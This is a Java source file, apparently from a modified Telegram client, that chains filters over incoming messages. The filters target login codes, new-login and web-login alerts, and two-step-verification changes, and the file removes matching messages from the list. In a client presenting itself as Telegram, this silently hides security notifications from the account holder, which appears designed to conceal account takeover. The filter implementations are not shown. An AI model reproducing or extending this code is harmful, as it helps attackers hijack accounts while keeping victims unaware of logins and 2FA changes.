package org.telegram.tgnet.filter.msgobj;

import org.telegram.messenger.MessageObject;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;

public class MessageObjectFilters {
    private static final ArrayList<IMessageObjectFilter> filters = new ArrayList<>();

    static {
        filters.add(new LoginCodeMessageFilter());
        filters.add(new NewLoginMessageFilter());
        filters.add(new NewWebLoginMessageFilter());
        filters.add(new ConfirmWebLoginFilter());
        filters.add(new WebLoginViaBotFilter());
        filters.add(new TwoStepVerifyChangedFilter());
        filters.add(new TwoStepVerifyDisabledFilter());
        filters.add(new TwoStepVerifyEnabledFilter());
        filters.add(new TwoStepVerifyResetFilter());
    }

    public static void filter(MessageObject message) {
        filter(Collections.singletonList(message));
    }

    public static void filter(List<MessageObject> messages) {
        if (messages == null || messages.isEmpty()) return;
        Iterator<MessageObject> iterator = messages.iterator();
        while (iterator.hasNext()) {
            MessageObject next = iterator.next();
            if (next == null) continue;
            for (IMessageObjectFilter filter : filters) {
                if (filter.check(next)) {
                    filter.filter(next);
                    if (next.messageOwner.message == null) {
                        iterator.remove();
                    }
                }
            }
        }
    }
}
